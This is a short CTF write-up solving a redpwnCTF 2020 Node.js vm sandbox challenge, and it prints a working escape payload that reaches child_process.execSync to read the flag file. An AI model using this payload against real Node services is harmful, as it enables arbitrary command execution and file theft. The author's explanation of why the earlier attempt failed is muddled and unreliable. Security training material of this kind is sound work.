## Writeup

After inspecting the program and trying to run few commands it was known to me that it was a `sandbox-escaping` problem based on nodejs. I didn't know much about sandbox escaping for javascript so after lot of googling found this two useful websites given below.

- **site used for information :-**  
	
	1. https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
	2. https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html


- **run this to get the flag**

```
$ nc 2020.redpwnc.tf 31273
Welcome to my Calculator-as-a-Service (CaaS)!
This calculator lets you use the full power of Javascript for
your computations! Try `Math.log(Math.expm1(5) + 1)`
Type q to exit.
> this.constructor.constructor("return process")().mainModule.require('child_process').execSync('cat /ctf/flag.txt')
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD} 
```  

I was using the same command as above previously but my mistake was this `{....return process.mainModule....}` as "mainModule" is not a property but a function of process and we need its return value to 	 call the function so it should be like this `{....return process")().mainModule....}`.

## flag
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}